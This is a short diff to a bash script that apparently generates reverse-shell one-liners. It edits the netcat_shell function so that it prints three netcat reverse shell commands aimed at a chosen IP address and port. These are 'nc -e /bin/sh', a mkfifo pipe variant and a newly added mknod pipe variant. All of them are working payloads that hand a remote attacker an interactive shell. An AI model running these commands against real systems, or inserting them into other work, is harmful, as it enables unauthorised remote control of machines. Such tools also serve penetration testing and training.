@@ -108,9 +108,11 @@ function ruby_shell(){
 
 function netcat_shell(){
 
-	echo -e "${pos}${Yellow}Netcat shell [1]:${Color_Off} nc -e /bin/sh ${Red}$ipaddr $port${Color_Off}\n\n"
+	echo -e "${pos}${Yellow}Netcat shell [1]:${Color_Off} nc -e /bin/sh ${Red}$ipaddr $port${Color_Off}\n"
 	
-	echo -e "${pos}${Yellow}Netcat shell [2]:${Color_Off} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${Red}$ipaddr $port${Color_Off} >/tmp/f"
+	echo -e "${pos}${Yellow}Netcat shell [2]:${Color_Off} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${Red}$ipaddr $port${Color_Off} >/tmp/f\n"
+
+        echo -e "${pos}${Yellow}Netcat shell [3]:${Color_Off} rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc ${Red}$ipaddr $port${Color_Off} 1>/tmp/l"
 }
 
 function java_shell(){
